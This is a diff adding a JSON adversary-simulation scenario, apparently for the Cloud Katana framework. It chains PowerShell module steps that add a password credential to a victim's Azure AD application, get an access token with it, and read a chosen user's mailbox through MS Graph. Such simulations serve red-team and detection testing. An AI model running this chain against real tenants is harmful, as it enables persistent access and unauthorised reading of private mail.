@@ -1,0 +1,137 @@
+{
+    "id": "attackscenario-81b67a16-5218-41e6-8c6d-1fc6a10b757a",
+    "name": "Add New Password Credential to Azure AD Application and Read Mail",
+    "metadata": {
+        "creationDate": "2022-04-28",
+        "modificationDate": "2022-04-28",
+        "platform": [
+            "Azure"
+        ],
+        "description": "A campaign to simulate a threat actor adding password credentials to an Azure AD application, getting an access token with the new credentials and reading mail from a specific user via MS Graph with the security context of the Azure AD application.",
+        "contributors": [
+            "Roberto Rodriguez @Cyb3rWard0g"
+        ],
+        "mitreAttack": [
+            {
+                "technique": "T1098.001",
+                "tactics": [
+                    "TA0003"
+                ]
+            }
+        ]
+    },
+    "authorization": [
+        {
+            "resource" : "https://graph.microsoft.com/",
+            "permissionsType" : "application",
+            "permissions" : [
+                "Application.ReadWrite.All",
+                "Mail.Read"
+            ]
+        }
+    ],
+    "parameters": {
+        "appClientId": {
+            "type": "string",
+            "metadata": {
+                "description": "Client Id of the victim's Azure AD Application"
+            },
+            "defaultValue": "test"
+        },
+        "appObjectId": {
+            "type": "string",
+            "metadata": {
+                "description": "Object Id of the victim's Azure AD Application"
+            },
+            "defaultValue": "test"
+        },
+        "userPrincipalName": {
+            "type": "string",
+            "metadata": {
+                "description": "e-mail address to read mailbox messages from"
+            },
+            "defaultValue": "test"
+        }
+    },
+    "steps": [
+        {
+            "number": 1,
+            "name": "AddPasswordToAADApp",
+            "execution": {
+                "type": "ScriptModule",
+                "platform": "Azure",
+                "executor": "PowerShell",
+                "module": {
+                    "name": "CloudKatanaAbilities",
+                    "version": "1.3.1",
+                    "function": "New-CKAzADAppPassword"
+                },
+                "parameters": {
+                    "appObjectId": {
+                        "type": "string",
+                        "defaultValue": "parameters(appObjectId)"
+                    }
+                }
+            },
+            "wait": 30
+        },
+        {
+            "number": 2,
+            "name": "GetAccessToken",
+            "dependsOn": [
+                1
+            ],
+            "execution": {
+                "type": "ScriptModule",
+                "platform": "Azure",
+                "executor": "PowerShell",
+                "module": {
+                    "name": "CloudKatanaAbilities",
+                    "version": "1.3.1",
+                    "function": "Get-CKAccessToken"
+                },
+                "parameters": {
+                    "ClientId": {
+                        "type": "string",
+                        "defaultValue": "parameters(appClientId)"
+                    },
+                    "GrantType": {
+                        "type": "string",
+                        "defaultValue": "client_credentials"
+                    },
+                    "AppSecret": {
+                        "type": "string",
+                        "defaultValue": "reference(1).secretText"
+                    }
+                }
+            }
+        },
+        {
+            "number": 3,
+            "name": "GetMailboxMessages",
+            "dependsOn": [
+                2
+            ],
+            "execution": {
+                "type": "ScriptModule",
+                "platform": "Azure",
+                "executor": "PowerShell",
+                "module": {
+                    "name": "CloudKatanaAbilities",
+                    "version": "1.3.1",
+                    "function": "Get-CKMailboxMessages"
+                },
+                "parameters": {
+                    "accessToken": {
+                        "type": "string",
+                        "defaultValue": "reference(2).access_token"
+                    },
+                    "userPrincipalName": {
+                        "type": "string",
+                        "defaultValue": "parameters(userPrincipalName)"
+                    }
+                }
+            }
+        }
+    ]
+}
